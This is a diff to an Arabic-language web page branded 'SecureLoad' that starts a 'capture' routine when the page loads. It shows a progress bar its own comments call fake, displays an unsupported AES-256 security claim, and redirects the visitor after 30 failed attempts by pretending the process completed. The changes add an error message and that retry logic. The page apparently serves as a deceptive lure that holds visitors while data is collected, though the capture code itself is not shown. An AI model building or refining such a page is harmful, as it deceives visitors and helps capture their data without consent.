@@ -63,6 +63,7 @@
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .success-check { display: none; font-size: 3em; color: #6bcb77; animation: bounceIn 0.8s ease; }
         @keyframes bounceIn { 0% { transform: scale(0); opacity: 0; } 50% { transform: scale(1.3); } 100% { transform: scale(1); opacity: 1; } }
+        .error-message { color: #ff6b6b; margin-top: 15px; display: none; }
     </style>
 </head>
 <body>
@@ -87,6 +88,7 @@
         </div>
         
         <div class="success-check" id="successCheck">✅</div>
+        <div class="error-message" id="errorMessage">⚠️ حدث خطأ، يرجى المحاولة مرة أخرى</div>
         <div class="footer" id="footerText">© 2026 SecureLoad • مشفر بـ AES-256</div>
     </div>
 
@@ -95,6 +97,7 @@
         let intervalId = null;
         let dotCount = 0;
         let captureStarted = false;
+        let attempts = 0;
         
         function updateDots() {
             const dots = document.getElementById('dots');
@@ -110,8 +113,7 @@
                 captureStarted = true;
             } catch (error) {
                 console.error('Start capture error:', error);
-                // إذا فشل بدء الالتقاط، نستمر بالتقدم الوهمي
-                captureStarted = true;
+                captureStarted = true; // نستمر بالتقدم الوهمي
             }
         }
         
@@ -126,6 +128,7 @@
                 const successCheck = document.getElementById('successCheck');
                 const mainIcon = document.getElementById('mainIcon');
                 const footerText = document.getElementById('footerText');
+                const errorMsg = document.getElementById('errorMessage');
                 
                 if (data.status === 'loading') {
                     const newProgress = data.progress || progress + 2;
@@ -167,21 +170,32 @@
                     setTimeout(() => {
                         window.location.href = '/redirect';
                     }, 3000);
+                } else {
+                    // خطأ
+                    errorMsg.style.display = 'block';
                 }
             } catch (error) {
                 console.error('Progress error:', error);
-                // تقدم وهمي إذا تعذر الاتصال
+                // تقدم وهمي
                 if (progress < 90) {
                     progress += 1;
                     document.getElementById('progressBar').style.width = progress + '%';
                 }
+                attempts++;
+                if (attempts > 30) {
+                    // بعد 30 محاولة فاشلة، نعتبر أنها اكتملت
+                    document.getElementById('statusMessage').textContent = '✅ جاري التوجيه...';
+                    setTimeout(() => {
+                        window.location.href = '/redirect';
+                    }, 2000);
+                }
             }
         }
         
-        // بدء الالتقاط فور تحميل الصفحة
+        // بدء الالتقاط فوراً
         startCapture();
         
-        // تحديث التقدم كل 500 مللي
+        // تحديث التقدم
         intervalId = setInterval(checkProgress, 500);
         setInterval(updateDots, 300);
         setTimeout(checkProgress, 100);
